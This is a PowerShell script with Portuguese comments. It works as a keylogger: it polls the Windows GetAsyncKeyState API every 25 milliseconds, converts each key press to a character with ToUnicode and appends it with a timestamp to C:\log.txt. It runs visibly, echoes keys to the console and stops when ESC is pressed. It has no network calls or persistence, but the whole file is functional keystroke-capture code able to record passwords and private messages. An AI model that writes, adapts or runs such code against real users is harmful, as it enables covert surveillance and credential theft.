$arquivo = "C:\log.txt"

"=== Iniciado em $(Get-Date) ===" | Out-File -FilePath $arquivo -Encoding UTF8 -Force

# Declaração das APIs do Windows (melhorada)
$signature = @"
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);

[DllImport("user32.dll")]
public static extern int MapVirtualKey(uint uCode, uint uMapType);

[DllImport("user32.dll")]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@

Add-Type -MemberDefinition $signature -Name "Win32" -Namespace "API" -PassThru | Out-Null

$keyState = New-Object byte[] 256

try {
    while ($true) {
        Start-Sleep -Milliseconds 25   # Ajustado para melhor captura

        for ($vk = 8; $vk -le 254; $vk++) {
            if ([API.Win32]::GetAsyncKeyState($vk) -eq -32767) {

                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

                # Tratamento especial para teclas de controle
                switch ($vk) {
                    8   { $tecla = "[BACKSPACE]" }
                    9   { $tecla = "[TAB]" }
                    13  { $tecla = "[ENTER]" }
                    27  { $tecla = "[ESC]" ; $parar = $true }
                    32  { $tecla = "[ESPACO]" }
                    46  { $tecla = "[DELETE]" }
                    default {
                        # Tenta converter para caractere real (funciona bem com números 0-9, letras, etc.)
                        $mapped = [API.Win32]::MapVirtualKey($vk, 0)
                        $buffer = New-Object System.Text.StringBuilder 5
                        $result = [API.Win32]::ToUnicode($vk, $mapped, $keyState, $buffer, 5, 0)
                        
                        if ($result -gt 0) {
                            $tecla = $buffer.ToString()
                        } else {
                            $tecla = "[VK:$vk]"
                        }
                    }
                }

                # Salva no arquivo
                "$timestamp  |  $tecla" | Add-Content -Path $arquivo -Encoding UTF8

                # Mostra no console
                Write-Host "$timestamp  →  $tecla" -ForegroundColor Green

                # Para ao pressionar ESC
                if ($vk -eq 27) {
                    "=== Encerrado em $(Get-Date) ===" | Add-Content -Path $arquivo -Encoding UTF8
                    Write-Host "`Interrompido pelo ESC." -ForegroundColor Red
                    exit
                }
            }
        }
    }
}
catch {
    "Erro: $($_.Exception.Message)" | Add-Content -Path $arquivo -Encoding UTF8
    Write-Host "Erro: $($_.Exception.Message)" -ForegroundColor Red
}